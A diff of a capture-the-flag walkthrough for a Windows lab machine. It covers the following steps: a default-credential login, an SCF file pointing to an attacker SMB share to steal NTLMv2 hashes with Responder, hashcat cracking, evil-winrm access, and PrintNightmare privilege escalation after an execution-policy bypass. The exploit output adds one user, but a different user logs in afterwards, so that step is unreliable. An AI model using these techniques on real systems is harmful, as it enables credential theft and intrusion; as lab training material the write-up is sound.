@@ -1,6 +1,7 @@
 #-------Enumeration-------#
-┌──(mido㉿kali)-[~]
-└─$ nmap -sC -sV 10.10.11.106                         
+
+┌──(mido㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.106
+
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-10 20:30 EST
 Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 99.76% done; ETC: 20:30 (0:00:00 remaining)
@@ -36,28 +37,24 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 56.05 seconds
-
 #we find port 80 is opened we try to open browser http://10.10.11.106
 
-It asks for creds , trying the default admin:admin & it works! 
-Trying msfvenom payloads to get reverse shell and Pentestmonkey reverse shell our fav ! but nothing works 
+It asks for creds , trying the default admin:admin & it works! Trying msfvenom payloads to get reverse shell and Pentestmonkey reverse shell our fav ! but nothing works
 
 Then i notice this line in the index " Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon. "
 
-i started to search for reverse shell for smb share reverse shell and thanks to https://www.puckiestyle.nl/smb-share-scf-file-attacks/ 
-
+i started to search for reverse shell for smb share reverse shell and thanks to https://www.puckiestyle.nl/smb-share-scf-file-attacks/
 
 [Shell]
 Command=2
 IconFile=\\10.10.14.8\share\test.ico
 [Taskbar]
 Command=ToggleDesktop
-
 here is the code we use for reverse shell
 
-Saving the test.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the test.scf on the top of the share drive.
+Saving the test.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the @test.scf on the top of the share drive.
 
-so it will be `test.scf`
+so it will be test.scf
 
 Then we use responder tool to capture the hashes of the users that will browse the share.
 
@@ -114,22 +111,20 @@ Options:
   --lm                  Force LM hashing downgrade for Windows XP/2003 and
                         earlier. Default: False
   -v, --verbose         Increase verbosity.
+┌──(mido㉿kali)-[~] └─$ sudo responder -wrf --lm -v -I tun0
 
-
-
-                                                                                                                                                                                                                                    
-┌──(mido㉿kali)-[~]
-└─$ sudo responder -wrf --lm -v -I tun0                                                                                                                                                                                                2 ⚙
+    2 ⚙
 
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|
+       NBT-NS, LLMNR & MDNS Responder 3.0.6.0
 
-           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
 
-  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+
+ Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
 
 
@@ -204,27 +199,22 @@ Options:
 [SMB] NTLMv2 Client   : 10.10.11.106
 [SMB] NTLMv2 Username : DRIVER\tony
 [SMB] NTLMv2 Hash     : tony::DRIVER:7ea7545b4786c789:6C992007E05810D18BA8D075E00F1209:0101000000000000210CDEA04CEED7015D490E8C401F10F600000000020000000000000000000000
+When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user
 
+#----cracking hash------# Save the hash into txt file hashNTLM.txt
 
-When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. 
-Windows will try to authenticate to that share with the username and the password of the user
-
-#----cracking hash------#
-Save the hash into txt file hashNTLM.txt
-
-hashcat -m 5600 hashNTLM.txt /usr/share/wordlists/rockyou.txt --force  we will use `5600` for `NTLMv2`
+hashcat -m 5600 hashNTLM.txt /usr/share/wordlists/rockyou.txt --force we will use 5600 for NTLMv2
 
 TONY::DRIVER:5516d866b64ca220:c581f403958d002f6b0baa60e1326cb1:0101000000000000fd14e69f4ceed7012f27684bbbfbda7d00000000020000000000000000000000:liltony
-
 Great! "tony:liltony"
 
-#_____Evil-WinRM_______#
+#Evil-WinRM__#
 
-`evil-winrm  -i 10.10.11.106 -u tony -p 'liltony'` First it didn't work then i reset the machine and later it worked well.
+evil-winrm -i 10.10.11.106 -u tony -p 'liltony' First it didn't work then i reset the machine and later it worked well.
 
-Now we are connected 
+Now we are connected
 
-*Evil-WinRM* PS C:\Users\tony> cd Desktop
+Evil-WinRM* PS C:\Users\tony> cd Desktop
 *Evil-WinRM* PS C:\Users\tony\Desktop> dir
 
 
@@ -238,10 +228,7 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
 131a68852882898e573cc6f67ddced4b
-
-#______privilege escalation_______#
-using WinPeas.exe 
-
+#privilege escalation_# using WinPeas.exe
 
 Enumerating IPv4 connections
  
@@ -277,28 +264,20 @@ TCP        [::]                                        49410         [::]       
 TCP        [::]                                        49411         [::]                                        0               Listening         816             svchost
 TCP        [::]                                        49412         [::]                                        0               Listening         568             services
 TCP        [::]                                        49413         [::]                                        0               Listening         576             lsass
-
-
-We find `spoolsv` which is Print Spooler service 
+We find spoolsv which is Print Spooler service
 
 So time to exploit , i start with cloning https://github.com/calebstewart/CVE-2021-1675
 
-Then i move to to the remote host to apply out attack 
+Then i move to to the remote host to apply out attack
 
-python -m SimpleHTTPServer 8001                                                                                                                                                                                                    3 ⚙
-Serving HTTP on 0.0.0.0 port 8001 ...
-10.10.11.106 - - [10/Dec/2021 19:20:00] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
+python -m SimpleHTTPServer 8001 3 ⚙ Serving HTTP on 0.0.0.0 port 8001 ... 10.10.11.106 - - [10/Dec/2021 19:20:00] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
 
+Then Import-Module .\cve.ps1 i got error File C:\Users\tony\Documents\cve.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
 
-Then 
-Import-Module .\cve.ps1 
-i got error 
-File C:\Users\tony\Documents\cve.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
-
-So first we need to be able to load the ps1 script `https://stackoverflow.com/questions/41117421/ps1-cannot-be-loaded-because-running-scripts-is-disabled-on-this-system`
+So first we need to be able to load the ps1 script https://stackoverflow.com/questions/41117421/ps1-cannot-be-loaded-because-running-scripts-is-disabled-on-this-system
 
 *Evil-WinRM* PS C:\Users\tony\Documents> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
-*Evil-WinRM* PS C:\Users\tony\Documents> Get-ExecutionPolicy #check if the policy is unrestricted 
+*Evil-WinRM* PS C:\Users\tony\Documents> Get-ExecutionPolicy 
 Unrestricted
 
 
@@ -309,7 +288,6 @@ Unrestricted
 [+] added user 0xdf as local administrator
 [+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
 *Evil-WinRM* PS C:\Users\tony\Documents> 
-
 our user is added so let's open new tab in our terminal
 
 evil-winrm -i 10.10.11.106 -u Vendetta -p Vendetta00
@@ -329,10 +307,7 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 d0beabd41e64a23047dc6a4aaa158aa1
-
-
-##Done 
+##Done
 
 00
-
 
